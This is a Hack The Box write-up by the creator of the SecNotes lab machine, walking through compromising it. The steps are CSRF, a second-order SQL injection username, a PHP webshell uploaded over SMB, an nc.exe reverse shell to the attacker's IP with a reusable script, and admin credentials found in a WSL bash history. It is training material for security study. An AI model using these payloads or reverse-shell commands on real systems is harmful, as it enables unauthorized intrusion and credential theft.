---
title: HTB: SecNotes
url: https://0xdf.gitlab.io/2019/01/19/htb-secnotes.html
date: 2019-01-19T14:00:00+00:00
difficulty: Medium [30]
os: Windows
tags: hackthebox, ctf, htb-secnotes, csrf, second-order-sqli, second-order, smb, wsl, bash.exe, winexe, smbclient, webshell, htb-nightmare, oscp-like-v2, oscp-like-v1
---

![](https://0xdfimages.gitlab.io/img/secnotes-cover.png)SecNotes is a bit different to write about, since I built it. The goal was to make an easy Windows box that, though the HTB team decided to release it as a medium Windows box. It was the first box I ever submitted to HackTheBox, and overall, it was a great experience. I’ll talk about what I wanted to box to look like from the HTB user’s point of view in Beyond Root. SecNotes had a neat XSRF in the site that was completely bypassed by most people using an unintentional second order SQL injection. Either way, after gaining SMB credentials, it allowed the attacker to upload a webshell, and get a shell on the host. Privesc involved diving into the Linux Subsystem for Windows, finding the history file, and getting the admin creds from there.

## Box Info

| Name | [SecNotes](https://hackthebox.com/machines/secnotes)  [SecNotes](https://hackthebox.com/machines/secnotes) [Play on HackTheBox](https://hackthebox.com/machines/secnotes) |
| --- | --- |
| Release Date | [25 Aug 2018](https://twitter.com/hackthebox_eu/status/1032191939918094337) |
| Retire Date | 04 May 2024 |
| OS | Windows Windows |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for SecNotes |
| Radar Graph | Radar chart for SecNotes |
| First Blood User | 01:09:23[stefano118 stefano118](https://app.hackthebox.com/users/3603) |
| First Blood Root | 01:58:35[attl4s attl4s](https://app.hackthebox.com/users/22983) |
| Creator | [0xdf 0xdf](https://app.hackthebox.com/users/4935) |

## Recon

### nmap

`nmap` shows two webservers, as well as smb open on the target:

```

root@kali# nmap -sT -p- --min-rate 10000 -oA nmap/alltcp 10.10.10.97
Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-13 12:06 EST
Nmap scan report for 10.10.10.97
Host is up (0.018s latency).
Not shown: 65532 filtered ports
PORT     STATE SERVICE
80/tcp   open  http
445/tcp  open  microsoft-ds
8808/tcp open  ssports-bcast

Nmap done: 1 IP address (1 host up) scanned in 13.41 seconds

root@kali# nmap -sC -sV -p 80,445,8808 -oA nmap/scripts 10.10.10.97
Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-13 12:08 EST
Nmap scan report for 10.10.10.97
Host is up (0.018s latency).

PORT     STATE SERVICE      VERSION
80/tcp   open  http         Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
| http-title: Secure Notes - Login
|_Requested resource was login.php
445/tcp  open  microsoft-ds Windows 10 Enterprise 17134 microsoft-ds (workgroup: HTB)
8808/tcp open  http         Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows
Service Info: Host: SECNOTES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h32m28s, deviation: 4h37m09s, median: -7m32s
| smb-os-discovery: 
|   OS: Windows 10 Enterprise 17134 (Windows 10 Enterprise 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: SECNOTES
|   NetBIOS computer name: SECNOTES\x00
|   Workgroup: HTB\x00
|_  System time: 2019-01-13T09:01:07-08:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2019-01-13 12:01:08
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 52.29 seconds

```

Based on the `nmap` results, it looks like a Windows 10 host.

### New Site - TCP 8808

This site only seems to have the IIS default page:

![1547401309505](https://0xdfimages.gitlab.io/img/1547401309505.png)

I’ll make a note, perhaps start a `gobuster` in the background (which won’t find anything), and move on for now.

### SecNotes - TCP 80

#### site - Login / Registration

On visiting the page, I’m redirected to `/login.php`, where the title bar says “Secure Notes - Login”, and there’s a form:

![1529672558612](https://0xdfimages.gitlab.io/img/1529672558612.png)

Clicking “Sign up now” takes me to `/register.php`:

![1529672854045](https://0xdfimages.gitlab.io/img/1529672854045.png)

I can create a user. On doing so, I’m redirected back to the login page.

On logging in, I’m redirected to `/home.php`:

![1529672943136](https://0xdfimages.gitlab.io/img/1529672943136.png)

The note at the top of the screen has hints:

> Due to GDPR, all users must delete any notes that contain Personally Identifable Information (PII)
> Please contact **tyler@secnotes.htb** using the contact link below with any questions.

The admin’s name is tyler, and that the site is expecting interaction. If I check at the login page, tyler is a valid account on this site.

The four buttons allow actions. Creating a note will put a note in my page. This process is has no filtering, and the user can submit all sorts of nefarious stuff into a note. However, since there’s no way to share a note with another user, most XSS attacks would only work against you the attacker.

Signing out will simply destroy my session and redirect back to login page. The other two buttons are interesting.

#### Change Password

The “Change Password” button takes us to `/change_pass.php`, which has a form:

![1529673139930](https://0xdfimages.gitlab.io/img/1529673139930.png)

I’ll notice that it doesn’t request the current password. The form submits to `/change_pass.php`. When I do submit, that seems to redirect immediately back to `/home.php`, with a message saying the password was changed:

![1547400767955](https://0xdfimages.gitlab.io/img/1547400767955.png)

In burp, I’ll see that the POST to `/change_pass.php` has the following data: `password=tttttt&confirm_password=tttttt&submit=submit`.

![1547671763484](https://0xdfimages.gitlab.io/img/1547671763484.png)

If I try that request as a GET by visiting `http://10.10.10.97/change_pass.php?password=tttttt&confirm_password=tttttt&submit=submit`, it works! That’ll prove useful in a bit.

#### Contact Us

The “Contact Us” button takes me to a contact page:

![1529673503850](https://0xdfimages.gitlab.io/img/1529673503850.png)

On sending a message, I’m redirected back to home, with a note saying “Message Sent”.

I’ll also find that if I include a link in the message, it is clicked. For example, if I include `http://10.10.14.15` in the message, I’ll get the following a few seconds later:

```

root@kali# nc -lnvp 80
listening on [any] 80 ...
connect to [10.10.14.15] from (UNKNOWN) [10.10.10.97] 62326
GET / HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.17134.112
Host: 10.10.14.15
Connection: Keep-Alive

```

## Get Tyler’s Credentials

### Intended Route: XSRF

#### What Is XSRF?

A Cross-Site Request Forgery (XSRF) is also known as “one-click attack” and “session riding”. The idea is that an attacker can craft a url such that when a target visits it, some actions or commands are taken that the user may not have wanted to take. For a site that’s vulnerable to XSRF, this can be a nasty attack, since the attacker can control the text of the link they send the target, making it not too hard to trick people into clicking on links.

This is an old attack vector, but one that’s still around today. Techcrunch just published an [article](https://techcrunch.com/2019/01/14/web-hosting-account-hacks/) on 14 January about how many web hosting sites were vulnerable to account takeover via XSRF.

XSRF is easily defeated by including POST parameters such as a token in the form that generates the request which would not be replicated in the link passed to the target.

#### XSRF in Action

The combination of the `/change_pass.php` accepting GET and not requiring the current password, and my ability to get someone to click on links in the `/contact.php` page provides an opportunity for a Cross-Site Request Forgery (XSRF) attack.

I’ll include url to change the password in the message, and then another for our local host, when I see a callback, I can try to log in as tyler.

So, send the following message:

![1547401103433](https://0xdfimages.gitlab.io/img/1547401103433.png)

Then wait and watch nc:

```

root@kali# nc -lnvp 80
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::80
Ncat: Listening on 0.0.0.0:80
Ncat: Connection from 10.10.10.97.
Ncat: Connection from 10.10.10.97:49733.
GET /complete HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.17134.228
Host: 10.10.14.15
Connection: Keep-Alive

```

Once I see the hit, try logging in as tyler/password, and I’m in as tyler:

![1547401190130](https://0xdfimages.gitlab.io/img/1547401190130.png)

The interesting note is the 3rd, “new site”, which seems to have SMB credentials:

![1529701030989](https://0xdfimages.gitlab.io/img/1529701030989.png)

### Unintended Route: Second Order SQLi

There’s a second order SQL injection vulnerability in the site. If I register as username `' or 1='1`, and then use that to log in, I’ll get access to all the notes in the site:

![](https://0xdfimages.gitlab.io/img/secnotes-sqli.gif)

In [Beyond Root](#second-order-sqli), I’ll go in detail as to why this works, and what mistake I made writing the site.

## SMB access as tyler

Using the creds from the site, I’ll use `smbmap` to see what I now have access to:

```

root@kali# smbmap -H 10.10.10.97 -u tyler -p '92g!mA8BGjOirkL%OG*&'
[+] Finding open SMB ports....
[+] User SMB session establishd on 10.10.10.97...
[+] IP: 10.10.10.97:445 Name: 10.10.10.97                                       
        Disk                                                    Permissions
        ----                                                    -----------
        ADMIN$                                                  NO ACCESS
        C$                                                      NO ACCESS
        IPC$                                                    READ ONLY
        new-site                                                READ, WRITE

```

I’ll connect to the SMB share as tyler, and find the basics of a default IIS site:

```

root@kali# smbclient -U 'tyler%92g!mA8BGjOirkL%OG*&' //10.10.10.97/new-site
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Jun 21 16:24:44 2018
  ..                                  D        0  Thu Jun 21 16:24:44 2018
  iisstart.htm                        A      696  Thu Jun 21 11:26:03 2018
  iisstart.png                        A    98757  Thu Jun 21 11:26:03 2018
  web.config                          A      270  Thu Jun 21 16:21:41 2018

                12978687 blocks of size 4096. 4930083 blocks available

```

This obviously isn’t the port 80 site, but it does match what I saw on the port 8808 site earlier. I’ll test that hypothesis and find it is that site:

```

root@kali# echo test > 0xdf.txt

```

```

smb: \> put 0xdf.txt
putting file 0xdf.txt as \0xdf.txt (1.2 kb/s) (average 0.6 kb/s)

```

```

root@kali# curl http://10.10.10.97:8808/0xdf.txt
test

```

## Shell as tyler

### Webshell

With access to write files over SMB and have them served back to me with php, I can drop a webshell. Since the SecNotes site was running on php, that seems like a good place to start. I like to start with a very basic webshell:

```

root@kali# cat /opt/shells/php/cmd.php 
<?php system($_REQUEST['cmd']); ?>

root@kali# smbclient -U 'tyler%92g!mA8BGjOirkL%OG*&' //10.10.10.97/new-site -c 'put /opt/shells/php/cmd.php 0xdf.php'
putting file /opt/shells/php/cmd.php as \0xdf.php (0.5 kb/s) (average 0.5 kb/s)

root@kali# curl http://10.10.10.97:8808/0xdf.php?cmd=whoami
secnotes\tyler

```

Success. I now have code execution.

### Interactive Shell

There’s multiple ways to go from Webshell to interactive shell on a windows host. Typically, on Windows my favorite is to use `powershell iex()` on a `webclient.downloadstring` object to load something like Nishang’s Invoke-PowerShellTcp.ps1. But since I already have unfettered write access to the host, this seems like as good a case as any to try something different and upload `nc.exe`.

First find a copy of `nc` and put it to disk:

```

root@kali# locate nc.exe
/opt/SecLists/Web-Shells/FuzzDB/nc.exe
/opt/shells/netcat/nc.exe
/usr/lib/mono/4.5/cert-sync.exe
/usr/share/seclists/Web-Shells/FuzzDB/nc.exe
/usr/share/sqlninja/apps/nc.exe
/usr/share/windows-binaries/nc.exe

root@kali# smbclient -U 'tyler%92g!mA8BGjOirkL%OG*&' //10.10.10.97/new-site -c 'put /opt/shells/netcat/nc.exe nc.exe'
putting file /opt/shells/netcat/nc.exe as \nc.exe (359.2 kb/s) (average 359.2 kb/s)

```

Next, invoke it to get a shell back:

```

root@kali# curl "http://10.10.10.97:8808/0xdf.php?cmd=nc.exe+-e+cmd.exe+10.10.14.15+443"

```

```

root@kali# nc -lnvp 443
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.97.
Ncat: Connection from 10.10.10.97:49738.
Microsoft Windows [Version 10.0.17134.228]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\inetpub\new-site>whoami
secnotes\tyler

```

From here I can grab `user.txt`:

```

C:\Users\tyler\Desktop>type user.txt
6fa75569...

```

### Directory Clearing

The root directory of the share / webserver seems to be cleared out very frequently, which could get annoying. I created a quick script to get a shell callback:

```

#!/bin/bash

if [ "$#" -ne 2 ]; then
    echo "Usage: $0 [ip] [port]"
    echo "Include ip and port to connect back to"
    exit
fi;

ip=$1
port=$2

echo "[*] Uploading webshell and nc.exe"
smbclient -U 'tyler%92g!mA8BGjOirkL%OG*&' //10.10.10.97/new-site -c 'put /opt/shells/php/cmd.php 0xdf.php' || (echo "[-] Upload php failed" && exit 1)
smbclient -U 'tyler%92g!mA8BGjOirkL%OG*&' //10.10.10.97/new-site -c 'put /opt/shells/netcat/nc.exe nc.exe' || (echo "[-] Upload nc failed" && exit 1)
echo "[+] Successfully uploaded webshell and nc.exe"

echo "[*] Triggering nc shell callback to ${ip}:${port}"
curl "http://10.10.10.97:8808/0xdf.php?cmd=nc.exe+-e+cmd.exe+${ip}+${port}"

```

## Privesc

### bash.exe

Enumerating the host, there’s a couple places that hint to look at the Linux Subsystem. First, on the desktop right next to `user.txt` is a shortcut to `bash`:

```

C:\Users\tyler\Desktop>dir                                                                                                                                                                                          [54/290]
dir                            
 Volume in drive C has no label.
 Volume Serial Number is 9CDD-BADA           
                                           
 Directory of C:\Users\tyler\Desktop                  
                                                
08/19/2018  02:51 PM    <DIR>          .         
08/19/2018  02:51 PM    <DIR>          ..          
06/22/2018  02:09 AM             1,293 bash.lnk                                                                 
04/11/2018  03:34 PM             1,142 Command Prompt.lnk
04/11/2018  03:34 PM               407 File Explorer.lnk
06/21/2018  04:50 PM             1,417 Microsoft Edge.lnk
06/21/2018  08:17 AM             1,110 Notepad++.lnk                                                                                   
08/19/2018  08:25 AM                34 user.txt
08/19/2018  09:59 AM             2,494 Windows PowerShell.lnk
               7 File(s)          7,897 bytes
               2 Dir(s)  33,220,325,376 bytes free

```

Additionally, in the root of C, there’s a `Distros\Ubuntu` path:

```

C:\Distros\Ubuntu>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 9CDD-BADA

 Directory of C:\Distros\Ubuntu

01/13/2019  09:52 AM    <DIR>          .
01/13/2019  09:52 AM    <DIR>          ..
07/11/2017  05:10 PM           190,434 AppxBlockMap.xml
07/11/2017  05:10 PM             2,475 AppxManifest.xml
06/21/2018  02:07 PM    <DIR>          AppxMetadata
07/11/2017  05:11 PM            10,554 AppxSignature.p7x
06/21/2018  02:07 PM    <DIR>          Assets
06/21/2018  02:07 PM    <DIR>          images
07/11/2017  05:10 PM       201,254,783 install.tar.gz
07/11/2017  05:10 PM             4,840 resources.pri
06/21/2018  04:51 PM    <DIR>          temp
07/11/2017  05:10 PM           222,208 ubuntu.exe
07/11/2017  05:10 PM               809 [Content_Types].xml
               7 File(s)    201,686,103 bytes
               6 Dir(s)  33,220,313,088 bytes free

```

### Find Admin Creds - Method 1: Run bash.exe

From here, it would make sense to run bash. The shortcut is to `bash.exe`, but it points to `C:\windows\system32\bash.exe`, which doesn’t exist:

```

C:\Users\tyler\Desktop>type bash.lnk
type bash.lnk
L wV    v(      9PO :+00/C:\V1LIWindows@        ﾋLLI.h&WindowsZ1L<System32B     ﾋLL<.pkSystem32Z2LP bash.exeB   ﾋL<LU.Ybash.exeK-JںݜC:\Windows\System32\bash.exe"..\..\..\Windows\System32\bash.exeC:\Windows\System32%    
                                                                                                                                                                                                                       wN]ND
.Q`Xsecnotesx<sA㍧o'/x<sA㍧o'/= Y1SPS0CGsf"=dSystem32 (C:\Windows)1SPSXFL8C&mq/S-1-5-21-1791094074-1363918840-4199337083-10021SPS0%G`%                                                                                     
        bash.exe@
                 )
                  Application@v(        i1SPSjc(=OMC:\Windows\System32\bash.exe91SPSmDpHH@.=xhH(bP

C:\Users\tyler\Desktop>\windows\system32\bash.exe
\windows\system32\bash.exe
'\windows\system32\bash.exe' is not recognized as an internal or external command, operable program or batch file.

```

I can search for `bash.exe`, and find it:

```

C:\Users\tyler\Desktop>where /R c:\ bash.exe                       
where /R c:\ bash.exe     
c:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17134.1_none_251beae725bc7de5\bash.exe

```

Now it’s just a matter of running it, and using `python` to get a interactive pty, just like on a Linux host:

```

C:\Users\tyler\Desktop>c:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17134.1_none_251beae725bc7de5\bash.exe
i mesg: ttyname failed: Inappropriate ioctl for device
id 
uid=0(root) gid=0(root) groups=0(root)  

python -c 'import pty;pty.spawn("/bin/bash")'
root@SECNOTES:~#

```

Now this root shell doesn’t have any specific privileges on the box. In fact, it has pretty sandboxed access, and can’t access anything tyler can’t access. But, I can look around in that sandbox, starting with the home directory:

```

root@SECNOTES:~# ls -la                                     
total 8                                       
drwx------ 1 root root  512 Jun 22  2018 .      
drwxr-xr-x 1 root root  512 Jun 21  2018 ..    
---------- 1 root root  398 Jun 22  2018 .bash_history
-rw-r--r-- 1 root root 3112 Jun 22  2018 .bashrc    
-rw-r--r-- 1 root root  148 Aug 17  2015 .profile         
drwxrwxrwx 1 root root  512 Jun 22  2018 filesystem

```

The `.bash_history` isn’t empty… I’ll check it out:

```

root@SECNOTES:~# cat .bash_history
cat .bash_history
cd /mnt/c/
ls
cd Users/
cd /
cd ~
ls
pwd
mkdir filesystem
mount //127.0.0.1/c$ filesystem/
sudo apt install cifs-utils
mount //127.0.0.1/c$ filesystem/
mount //127.0.0.1/c$ filesystem/ -o user=administrator
cat /proc/filesystems
sudo modprobe cifs
smbclient
apt install smbclient
smbclient
smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\\\127.0.0.1\\c$
> .bash_history
less .bash_history

```

It looks like the admin was trying to mount the local file system himself, and there’s the administrator password. It even seems that the user tried to clear the bash history, but because the current session is written in on exit, it only cleared history prior to this session.

### Find Admin Creds - Method 2: On Filesystem

The user’s bash file system is located in the users `AppData` folder inside the `rootfs` folder:

```

C:\Users\tyler\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc\LocalState\rootfs>dir
 Volume in drive C has no label.
 Volume Serial Number is 9CDD-BADA

 Directory of C:\Users\tyler\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc\LocalState\rootfs

06/21/2018  05:03 PM    <DIR>          .
06/21/2018  05:03 PM    <DIR>          ..
06/21/2018  05:03 PM    <DIR>          bin
06/21/2018  05:00 PM    <DIR>          boot
06/21/2018  05:00 PM    <DIR>          dev
06/22/2018  02:00 AM    <DIR>          etc
06/21/2018  05:00 PM    <DIR>          home
01/13/2019  10:02 AM            87,944 init
06/21/2018  05:00 PM    <DIR>          lib
06/21/2018  05:00 PM    <DIR>          lib64
06/21/2018  05:00 PM    <DIR>          media
06/21/2018  05:03 PM    <DIR>          mnt
06/21/2018  05:00 PM    <DIR>          opt
06/21/2018  05:00 PM    <DIR>          proc
06/22/2018  01:44 PM    <DIR>          root
06/21/2018  05:00 PM    <DIR>          run
06/22/2018  01:57 AM    <DIR>          sbin
06/21/2018  05:00 PM    <DIR>          snap
06/21/2018  05:00 PM    <DIR>          srv
06/21/2018  05:00 PM    <DIR>          sys
06/22/2018  01:25 PM    <DIR>          tmp
06/21/2018  05:02 PM    <DIR>          usr
06/21/2018  05:03 PM    <DIR>          var
               1 File(s)         87,944 bytes
              22 Dir(s)  33,220,313,088 bytes free

```

There’s no users in `/home`, but I can also get into `/root`:

```

C:\Users\tyler\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc\LocalState\rootfs\home>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 9CDD-BADA

 Directory of C:\Users\tyler\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc\LocalState\rootfs\home

06/21/2018  05:00 PM    <DIR>          .
06/21/2018  05:00 PM    <DIR>          ..
               0 File(s)              0 bytes
               2 Dir(s)  33,220,313,088 bytes free

C:\Users\tyler\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc\LocalState\rootfs\root>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 9CDD-BADA

 Directory of C:\Users\tyler\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc\LocalState\rootfs\root

06/22/2018  01:44 PM    <DIR>          .
06/22/2018  01:44 PM    <DIR>          ..
06/22/2018  02:09 AM             3,112 .bashrc
01/13/2019  10:04 AM               443 .bash_history
06/21/2018  05:00 PM               148 .profile
06/22/2018  01:56 AM    <DIR>          filesystem
               3 File(s)          3,703 bytes
               3 Dir(s)  33,220,313,088 bytes free

```

The `.bash_history` is available here as well:

```

C:\Users\tyler\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc\LocalState\rootfs\root>type .bash_history | findstr smbclient
type .bash_history | findstr smbclient
smbclient
apt install smbclient
smbclient
smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\\\127.0.0.1\\c$

```

### Root FS Access

One way to use the administrator creds is to connect to the localhost `c$` share:

```

C:\inetpub\new-site>net use \\127.0.0.1\c$ /user:administrator "u6!4ZwgwOM#^OBf#Nwnh"
net use \\127.0.0.1\c$ /user:administrator "u6!4ZwgwOM#^OBf#Nwnh"
The command completed successfully.

C:\inetpub\new-site>type \\127.0.0.1\c$\users\administrator\desktop\root.txt
type \\127.0.0.1\c$\users\administrator\desktop\root.txt
7250cde1...

```

I could also do the same thing with `smbclient` from my kali box.

### Shell as administrator

Better yet, I want a shell. With admin creds, I can now use `winexe` (or `psexec.py`) to get a shell on the box:

```

root@kali# winexe -U '.\administrator%u6!4ZwgwOM#^OBf#Nwnh' //10.10.10.97 cmd.exe
Microsoft Windows [Version 10.0.17134.228]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>whoami
whoami
secnotes\administrator

```

From there, I’ll grab `root.txt`:

```

C:\Users\Administrator\Desktop>type root.txt
type root.txt
7250cde1...

```

## Beyond Root

### Scenario

This box was centered around an admin named Tyler. Tyler is just starting a revamp to his website, and he’s building it on the same server the current site is running from. He’s hosting that site on a quite uncommon port because he doesn’t want it to be found yet, and he’s set the SMB password for himself to something quite long and difficult for security. So that he doesn’t forget it, he’s saved it in his secure notes website.

### Tyler Interaction

To simulate the admin (Tyler) interaction, SecNotes uses a powershell script. There a few bits the script has to achieve:
- Maintain cookie for logged in session to site as Tyler
- Get contact messages
- Visit links
- Sleep

The script is set to run on login as there’s a startup shortcut to launch the script in tyler’s startup directory.

#### Full Script

Here’s the full Script:

```

C:\Users\tyler\secnotes_contacts>type check-messages.ps1
type check-messages.ps1
$ip = ((ipconfig | findstr [0-9].\.)[0]).Split()[-1]
$session = New-Object Microsoft.PowerShell.Commands.WebRequestSession;

($ip + "|127.0.0.1|secnotes.htb").split("|") |
ForEach-Object{
        $cookie = New-Object System.Net.Cookie;
        $cookie.name = "PHPSESSID";
        $cookie.value = "cgg9uaoa794ibotbatm6h469v3";
        $cookie.domain = $_;
        $session.Cookies.Add($cookie);
}

while($true) {
        $found_url = 0

        # check for ip change
        $ip = ((ipconfig | findstr [0-9].\.)[0]).Split()[-1]
        if ($session.Cookies.GetCookies('http://' + $ip).length -lt 1) {
                Write-Host "New ip "$ip". Adding cookie"
                $cookie = New-Object System.Net.Cookie;
                $cookie.name = "PHPSESSID";
                $cookie.value = "cgg9uaoa794ibotbatm6h469v3";
                $cookie.domain = $ip;
                $session.Cookies.Add($cookie);
        }

        $file = Get-ChildItem "C:\Users\tyler\secnotes_contacts\" -Filter *.txt | Sort-Object CreationTime | Select-Object -First 1
        if ($file) {
                Write-Host "Opening file $($file)..."
                $content = Get-Content $file.FullName
                $content.split(' ') | ForEach-Object {
                        if ($_ -match "^https?://((([\w-]+\.)+[\w-]+)|localhost)(:\d+)?([\w- ./?&%=]*)$") {
                                $url = $matches[0];

                                Write-Host "Visiting $($url)"
                                try {
                                (iwr $url -WebSession $session -TimeoutSec 1 -UseBasicParsing).content
                                } catch {
                                        Write-Host "Page not found"
                                }
                                if ($url -match "change_pass.php") {
                                        Write-Host "Found change_pass.php... will sleep 30"
                                        $found_url = 1
                                }
                        }
                }

                Write-Host "Deleting file $($file)"
                Remove-Item $file.FullName
        }

        if ($found_url -eq 1) {
                Write-Host "Sleeping for 30 seconds"
                Start-Sleep -s 30
        } else {
                Write-Host "Sleeping for 5 seconds"
                Start-Sleep -s 5
        }
}

```

#### Set tyler’s SecNotes Cookie

The PHPSESSID is from the currently authenticated session for tyler on the SecNotes website. At the start of the script, it sets that value to the cookie for 127.0.0.1, secnotes.htb, and the current public IP, which is determined by running `$ip = ((ipconfig | findstr [0-9].\.)[0]).Split()[-1]`.

On each loop iteration, the script will again get the current IP, and then check to see that there’s a cookie for that url, and add it if not.

#### Get Messages

The php site drops messages into a folder as txt files. The script will open up the oldest file (from the contact page on the site), and split the text on spaces into words. It uses a regex to look for urls, and if there’s a url, tries to visit. It will visit each url in the message. The regex could be better, as it will miss links inside `<a href="`.

#### Visit Links

To visit links, the script uses `Invoke-WebRequest` (actually `iwr`), and it prints the content to the terminal. It uses a try/catch so that if the page isn’t found, it prints a nice message rather than an ugly error.

It then deletes the message file.

#### Sleep

If a url with the string `change_pass.php` is detected and visited, the script will sleep for 30 seconds. This is to give the players a chance to log in before someone else might change it.

Otherwise, the script will sleep for only 5 seconds. This will still give some space between clicks, but will hopefully not create a huge backlog, since really only one user can have tyler’s correct password at a time.

### Second Order SQLI

#### Irony

I wrote SecNotes before I had solved Nightmare, and before I really had a solid understanding of Second Order SQLI. It’s funny that a couple months later I’d solve Nightmare, and enjoy the concept of Second Order SQLI so much that I’d [write a post about it](/2018/07/07/second-order-sql-injection-on-htb-nightmare.html). Unfortunately at the time, it didn’t occur to me to go back and check for it in my own application, SecNotes.

I know a lot of people enjoyed this chance to do a second order sqli on an easier box, since only 411 people have owned user at this point on Nightmare. It is certainly a real world bug, as I made it by accident. That said, I still kick myself that it happened.

#### php Prepared Statements

Almost all of the database interaction in the php code looks like this snippet, from `login.php`:

```

// Prepare a select statement
$sql = "SELECT username, password FROM users WHERE username = ?";

if($stmt = mysqli_prepare($link, $sql)){
    // Bind variables to the prepared statement as parameters
    mysqli_stmt_bind_param($stmt, "s", $param_username);

    // Set parameters
    $param_username = $username;

    // Attempt to execute the prepared statement
    if(mysqli_stmt_execute($stmt)){
        // Store result
        mysqli_stmt_store_result($stmt);

        // Check if username exists, if yes then verify password
        if(mysqli_stmt_num_rows($stmt) == 1){
            // Bind result variables
            mysqli_stmt_bind_result($stmt, $username, $hashed_password);

```

By using these prepared statements, it prevents SQL injection. So there isn’t an SQL injection to bypass login.

#### Injection in SecNotes

I actually still remember writing the code for the main page, and thinking “well this one comes from the database, so I don’t need to go through all that hassel here”. The moral here is to never trust input, no matter if it’s coming directly from the user or not.

Here’s what the database interaction on the main page looks like to load the notes for the current user:

```

<?php
$sql = "SELECT id, title, note, created_at FROM posts WHERE username = '" . $username . "'";
$res = mysqli_query($link, $sql);
if (mysqli_num_rows($res) > 0) {     
    while ($row = mysqli_fetch_row($res)) {                                             
        echo '<button class="accordion"><strong>' . $row[1] . '</strong>  <small>[' . $row[3] . ']</small></button>';
        echo '<a href=/home.php?action=delete&id=' . $row[0] . '" class="btn btn-danger"><strong>X</strong></a>';
        echo '<div class="panel center-block text-left" style="width: 78%;"><pre>' . $row[2] . '</pre></div>';
    }                                     
} else {                    
    echo '<p>User <strong>' . $username . '</strong> has no notes. Create one by clicking below.</p>';
}                             
?>     

```

I didn’t use a prepared statement. Obviously, if `$username` is controlled by the user and not filtered, then SQLI is possible. So in the case of my SQLi username, `$sql` becomes: `"SELECT id, title, note, created_at FROM posts WHERE username = '' or 1='1'";`. That results in printing all the notes for all users.